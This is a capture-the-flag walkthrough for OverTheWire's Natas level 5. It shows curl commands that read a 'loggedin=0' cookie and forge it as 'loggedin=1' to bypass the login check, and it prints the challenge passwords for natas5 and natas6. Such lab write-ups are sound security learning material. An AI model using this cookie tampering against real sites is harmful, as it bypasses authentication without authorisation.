# Natas05

## Level Description
- **Username**: natas5
- **Password**: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
- **URL**: http://natas5.natas.labs.overthewire.org

## Method of Solving
When we try to login, we get the following error message:

![image-1](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas05/image-1.png)

Let's check header of the HTTP response with `curl`:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -I -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org 
HTTP/1.1 200 OK
Date: Sun, 01 Mar 2026 14:07:59 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=0
Content-Type: text/html; charset=UTF-8
```
As we can see we got a cookie `Set-Cookie: loggedin=0`. We can try modify it with the value 1.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -H 'Cookie: loggedin=1' -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org  

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

***You are welcome!***
